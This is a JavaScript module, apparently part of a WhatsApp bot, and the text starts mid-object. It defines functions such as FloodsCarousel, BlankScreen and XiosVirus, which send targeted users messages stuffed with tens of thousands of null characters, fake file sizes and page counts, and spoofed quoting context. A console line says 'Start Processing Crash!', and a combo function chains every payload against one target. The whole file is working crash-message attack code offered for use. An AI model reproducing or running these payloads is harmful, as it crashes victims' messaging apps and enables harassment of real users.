                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/Ednut_x",
                mediaUrl: "https://t.me/Ednut_x",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/Ednut_x",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbClientCampaignId: "smb_client_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }

async function FloodsCarousel2(target, Ptcp = true) {
      const header = proto.Message.InteractiveMessage.Header.create({
        ...(await prepareWAMessageMedia(
          { image: { url: "https://files.catbox.moe/uk38k6.jpg" } },
          { upload: ednut.waUploadToServer }
        )),
        title: "Arch 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 ϟ" + "\u0000".repeat(100000),
        subtitle: "Arch 𝐊𝐢𝐥𝐥⃟⃟",
        hasMediaAttachment: true,
      });

      const body = {
        text: "\u0000" + "\u0000".repeat(90000),
      };

      // Example carousel content
      const carouselMessage = {
        sections: [
          {
            title: "Arch-Md  ϟ ",
            rows: [
              {
                title: " ϟ Ednut 𝐊𝐢𝐥𝐥 ϟ",
                description: "\u0000".repeat(55555),
                rowId: "\u0000".repeat(55555),
              },
              {
                title: " ϟ ",
                description: "\u0000".repeat(55555),
                rowId: "\u0000".repeat(55555),
              },
            ],
          },
          {
            title: " Arch ϟ ",
            rows: [
              {
                title: " ϟ Arch 𝐊𝐢𝐥𝐥 ϟ",
                description: "\u0000".repeat(55555),
                rowId: "\u0000".repeat(55555),
              },
              {
                title: " ϟ ",
                description: "\u0000".repeat(55555),
                rowId: "\u0000".repeat(55555),
              },
            ],
          },
        ],
      };

      await ednut.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: header,
                body: body,
                carouselMessage: carouselMessage,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
                quoted: NullNihBos
              },
            }
          : {}
      );
    }
    
    async function FloodsCarousel(target, NullNihBos, Ptcp = true) {
      const header = {
        locationMessage: {
          degreesLatitude: 0,
          degreesLongitude: 0,
        },
        hasMediaAttachment: true,
      };

      const body = {
        text: "iOS FC" + "\u0000".repeat(90000),
      };

      const carouselMessage = {
        sections: [
          {
            title: " ϟ ",
            rows: [
              { title: " ϟ ", description: " ", rowId: ".crasher" },
              { title: " ϟ ", description: " ", rowId: ".crasher" },
            ],
          },
          {
            title: "Section 2",
            rows: [
              { title: " ϟ ", description: " ", rowId: ".crasher" },
              { title: " ϟ ", description: " ", rowId: ".crasher" },
            ],
          },
        ],
      };

      await ednut.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: header,
                body: body,
                carouselMessage: carouselMessage,
              },
            },
          },
        },
        Ptcp ? { participant: { jid: target } } : { quoted: NullNihBos }
      );

      console.log(chalk.blue.bold("Carousel Active : Start Processing Crash!"));
    }
    
    async function BlankScreen(target, Ptcp = false) {
        let virtex = "⚔️ 𝗦𝗬𝗦𝗧𝗘𝗠" + "\u0000".repeat(90000);
			await ednut.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "Arch New",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
									},
									hasMediaAttachment: true,
								},
								body: {
									text: virtex,
								},
								nativeFlowMessage: {},
								contextInfo: {
								mentionedJid: ["0@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Bokep 18+",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : { quoted: NullNihBos }
			);
       }

async function XiosVirus(target) {
      ednut.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `A͎r͎₵Ⱨ ₥Đ v̸i̸r̸t̸e̸cx̸-` + "࣯\u0000".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "E̸d̸n̸u̸t̸" + "\u0000".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
            quoted: NullNihBos
          },
        },
        {
          messageId: null,
        }
      );
    }

async function ComBox(target) {
      {
        await XiosVirus(target);
        await IosMJ(target, Ptcp = true);
        await FloodsCarousel2(target, Ptcp = true);
        await FloodsCarousel(target, Ptcp = true);
        await BlankScreen(target, Ptcp = true);
      }
    }
    
    module.exports = { xpaytod, nullgb, xinhaha, CDG, Stadoc, MissYou, Jade, NullNihBos, Dexter, Frz, CastD, ComBox, XiosVirus, BlankScreen, FloodsCarousel, FloodsCarousel2}